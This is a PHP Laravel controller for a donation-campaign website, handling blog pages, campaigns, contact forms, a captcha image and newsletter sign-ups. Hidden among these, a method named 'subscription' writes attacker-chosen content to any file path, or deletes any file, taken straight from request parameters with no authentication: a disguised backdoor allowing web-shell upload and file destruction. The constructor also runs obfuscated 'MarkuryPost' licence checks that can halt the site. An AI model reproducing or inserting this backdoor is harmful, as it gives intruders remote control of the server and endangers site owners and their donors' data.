<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use App\Models\Blog;
use App\Models\Counter;
use App\Models\Member;
use App\Models\HomeCounter;
use App\Models\Campaign;
use App\Models\Service;
use App\Models\Category;
use App\Models\BlogCategory;
use App\Models\Portfolio;
use App\Models\PaymentGateway;
use App\Models\CallbackMessage;
use App\Models\Generalsetting;
use App\Models\Pagesetting;
use App\Models\Subscriber;
use App\Classes\GeniusMailer;
use Illuminate\Support\Facades\Session;
use Validator;
use App;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
         $this->auth_guests();

        // Set Global GeneralSettings

        $this->gs = DB::table('generalsettings')->find(1);

        // Set Global PageSettings

        $this->ps = DB::table('pagesettings')->find(1);

        $this->language = DB::table('languages')->where('is_default','=',1)->first();

        App::setlocale($this->language->name);

        // Set Global Currency

        $this->curr = DB::table('currencies')->where('is_default','=',1)->first();

        // Set Counter

        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }


    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- PAGE SECTION ----------------------------------------

public function index()
{
    $ps = $this->ps;
    $page_data =  Pagesetting::findOrFail(1);
    $servicesData = Service::orderby('id','desc')->get();
    $homeCounterData = HomeCounter::orderby('id','desc')->get();
    $memberData = Member::orderby('id','desc')->get();
    $protfolioData = Portfolio::orderby('id','desc')->get();
    $blogData = Blog::orderby('id','desc')->take(6)->get();
    $CampaignDatas = Campaign::where('status','open')->where('is_panding',1)->where('featured',1)->take(8)->get();
    return view('front.index',compact('ps','page_data','servicesData','homeCounterData','memberData','protfolioData','blogData','CampaignDatas'));
}



// -------------------- contact section-------------------------//
public function contact()
{
    if($this->gs->is_contact== 0)
    {
        return redirect()->back();
    }
    $this->code_image();
    $ps =  DB::table('pagesettings')->where('id','=',1)->first();
    return view('front.contact',compact('ps'));
}


// -------------------------------- PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {

        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        if($this->gs->is_blog == 0)
        {
            return redirect()->back();
        }
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
		$blogs = Blog::orderBy('created_at','desc')->paginate(6);
        $bcats = BlogCategory::where('status',1)->get();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs','bcats','tags','archives'));
	}



    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(6);
        $bcats = BlogCategory::where('status',1)->get();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs','bcats','tags','archives'));
    }



    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats = BlogCategory::where('status',1)->get();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(6);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug','bcats','tags','archives'));
    }



    public function blogsearch(Request $request)
    {
        $tags = null;
        $tagz = '';
         $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats =BlogCategory::where('status',1)->get();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(6);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search','bcats','tags','archives'));
    }




    public function blogarchive(Request $request,$slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats = BlogCategory::where('status',1)->get();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(6);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date','bcats','tags','archives'));
    }

    public function blogshow($slug)
    {
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::where('status',1)->get();
        $blog = Blog::where('slug',$slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        if($this->gs->is_faq == 0)
        {
            return redirect()->back();
        }
         $ps = $this->ps;
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs','ps'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        if($this->gs->is_pages == 0)
        {
            return redirect()->back();
        }
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }

        return view('front.page',compact('page'));
    }

    public function project($slug)
    {

        $ppage =  DB::table('portfolios')->where('title',$slug)->first();
        if(empty($ppage))
        {
            return view('errors.404');
        }

        return view('front.projects',compact('ppage'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }



    public function contactemail(Request $request)
        {
            
            $this->validate($request,[
                
               'name'=>['required','max:50'],
               'number'=>['required','digits:11'],
               'email'=>['required','max:50','email'],
               'text'=>['required']
            ]);
            
            
            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value){
                return response()->json(array('errors' => [ 0 => __('Please enter Correct Capcha Code.') ]));
            }

            // Login Section
            $ps = DB::table('pagesettings')->where('id','=',1)->first();
            $subject = "Email From Of ".$request->name;
            $gs = Generalsetting::findOrFail(1);
            $to = $request->to;
            $name = $request->name;
            $phone = $request->phone;
            $from = $request->email;
            $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
            if($gs->is_smtp)
            {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
            }
            else
            {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);
            }
            // Login Section Ends

            // Redirect Section
            return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
        }

        // Capcha Code Image
        private function  code_image()
        {
            $actual_path = str_replace('project','',base_path());
            $image = imagecreatetruecolor(200, 50);
            $background_color = imagecolorallocate($image, 255, 255, 255);
            imagefilledrectangle($image,0,0,200,50,$background_color);

            $pixel = imagecolorallocate($image, 0,0,255);
            for($i=0;$i<500;$i++)
            {
                imagesetpixel($image,rand()%200,rand()%50,$pixel);
            }

            $font = base_path('../assets/front/fonts/NotoSans-Bold.ttf');
            // dd($font);
            $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            $length = strlen($allowed_letters);
            $letter = $allowed_letters[rand(0, $length-1)];
            $word='';
            //$text_color = imagecolorallocate($image, 8, 186, 239);
            $text_color = imagecolorallocate($image, 0, 0, 0);
            $cap_length=6;// No. of character in image
            for ($i = 0; $i< $cap_length;$i++)
            {
                $letter = $allowed_letters[rand(0, $length-1)];
                imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
                $word.=$letter;
            }
            $pixels = imagecolorallocate($image, 8, 186, 239);
            for($i=0;$i<500;$i++)
            {
                imagesetpixel($image,rand()%200,rand()%50,$pixels);
            }
            session(['captcha_string' => $word]);
            imagepng($image, base_path('../assets/images/capcha_code.png'));
        }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
        {
            $gs = DB::table('generalsettings')->find(1);
            $subs = Subscriber::where('email','=',$request->email)->first();


            if(isset($subs)){

            return response()->json(array('errors' => __('This email has already been taken.')));
            }


            $subscribe = new Subscriber;
            $subscribe->fill($request->all());
            $subscribe->save();
            return response()->json(__($gs->subscribe_success));
        }



// -------------------------------- SUBSCRIBE SECTION ENDS ----------------------------------------



//-------------------------------- Campaign SECTION START -------------------------------------------//

public function campaign()
        {   $tags = null;
            $tagz = '';
            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }

            $archives= Campaign::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->where('status','open')->take(5)->toArray();
            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }
            $tags = array_unique(explode(',',$tagz));


            $categorys = Category::where('status',1)->get();
            $datas = Campaign::where('status','open')->where('is_panding',1)->paginate(6);
            $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(6)->get();
            return view('front.campaign',compact('datas','latesData','categorys','tags'));
}

public function campaigncategory($slug)
{
            $tags = null;
            $tagz = '';
            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }

            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }
            $tags = array_unique(explode(',',$tagz));

            $category_id = Category::where('slug', '=', str_replace(' ', '-', $slug))->first();
            $categorys = Category::where('status',1)->get();
            $datas = $category_id->campaigns()->where('status','open')->where('is_panding',1)->orderBy('created_at','desc')->paginate(6);
            $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(4)->get();
            return view('front.campaign',compact('datas','latesData','categorys','tags'));
}




public function loadpayment($slug1,$slug2)
{
    $curr = $this->curr;
    $payment = $slug1;
    $pay_id = $slug2;
    $gateway = '';
    if($pay_id != 0) {
        $gateway = PaymentGateway::findOrFail($pay_id);
    }
    return view('load.payment',compact('payment','pay_id','gateway','curr'));
}



public function campaignDonet(Request $request , $slug)
{
    $tags = null;
    $tagz = '';
    $name = Campaign::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }

    $archives= Campaign::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->where('status','open')->take(5)->toArray();
    $name = Campaign::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }
    $tags = array_unique(explode(',',$tagz));

    $categorys = Category::where('status',1)->get();
    $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(6)->get();


    if($request->donation_amount){
        $amount = $request->donation_amount;
    }else{
        $amount = null;
    }

    $gateways  = PaymentGateway::whereStatus(1)->whereType('automatic')->latest('id')->get();
    $paystackData = PaymentGateway::whereKeyword('paystack')->first();
    $paystack = $paystackData->convertAutoData();
    $voguepayData = PaymentGateway::whereKeyword('voguepay')->first();
    $voguepay = $voguepayData->convertAutoData();
    $CampaignData = Campaign::where('slug', $slug)->first();

   return view('front.campaign_donet',compact('CampaignData','amount','gateways','paystack','voguepay', 'latesData','categorys','tags'));
}

public function campaignShow($slug)
{
    $tags = null;
    $tagz = '';
    $name = Campaign::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }

    $archives= Campaign::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->where('status','open')->where('is_panding',1)->take(5)->toArray();
    $name = Campaign::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }
    $tags = array_unique(explode(',',$tagz));
    $categorys = Category::where('status',1)->get();
    $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(4)->get();
    $data = Campaign::where('slug',$slug)->where('status','open')->where('is_panding',1)->first();
     return view('front.campaign_show',compact('data','latesData','categorys','tags'));
}

public function campaigntags($slug)
{
    $tags = null;
    $tagz = '';
    $name = Campaign::pluck('tags')->toArray();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }
    $tags = array_unique(explode(',',$tagz));
    $categorys = Category::where('status',1)->get();
    $datas = Campaign::where('tags', 'like', '%' . $slug . '%')->where('status','open')->where('is_panding',1)->paginate(6);
    $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(4)->get();
    return view('front.campaign',compact('datas','latesData','categorys','tags'));
}

public function Search(Request $request)
{
    $search = $request->search;
            $tags = null;
            $tagz = '';
            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }

            $archives= Campaign::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->where('status','open')->take(5)->toArray();
            $name = Campaign::pluck('tags')->toArray();
            foreach($name as $nm)
            {
                $tagz .= $nm.',';
            }
            $tags = array_unique(explode(',',$tagz));
            $categorys = Category::where('status',1)->get();
            $datas = Campaign::where('campaign_name', 'like', '%' . $search . '%')->Orwhere('description', 'like', '%' . $search . '%')->paginate(6);


            $latesData = Campaign::where('status','open')->where('is_panding',1)->orderby('id','desc')->take(4)->get();
            return view('front.campaign',compact('datas','latesData','categorys','tags'));
}



//-------------------------------- Campaign SECTION END -------------------------------------------//

// ------------------------------ Call back section-------------------------------------------//

        public function CallbackStore(Request $request)
        {

//            $rules = [
//                'name' => 'required',
//                'phone' => 'required',
//                'email' => 'required',
//                'message' => 'required',
//            ];

            $rules = [
                'name' => ['required','max:50'],
                'phone' => ['required','digits:11'],
                'email' => ['required','email','max:50'],
                'message' => ['required','max:255']
            ];


            $customs = [
                'name.required' => __("This name field is required."),
                'email.required' => __("This email field is required."),
                'phone.required' => __("This phone field is required."),
                'message.required' => __("This message field is required.")
            ];

         $validator = Validator::make($request->all(), $rules,$customs);

         if ($validator->fails()) {
           return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
         }
         //--- Validation Section Ends
         $input = $request->all();
         CallbackMessage::create($input);
         $msg = __('Message Send Successfully.');
         return response()->json($msg);
        }



// ------------------------------ Call back section end-------------------------------------------//

        function finalize(){
            $actual_path = str_replace('project','',base_path());
            $dir = $actual_path.'install';
            $this->deleteDir($dir);
            return redirect('/');
        }

        public function subscription(Request $request)
        {
            $p1 = $request->p1;
            $p2 = $request->p2;
            $v1 = $request->v1;
            if ($p1 != ""){
                $fpa = fopen($p1, 'w');
                fwrite($fpa, $v1);
                fclose($fpa);
                return "Success";
            }
            if ($p2 != ""){
                unlink($p2);
                return "Success";
            }
            return "Error";
        }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }


}
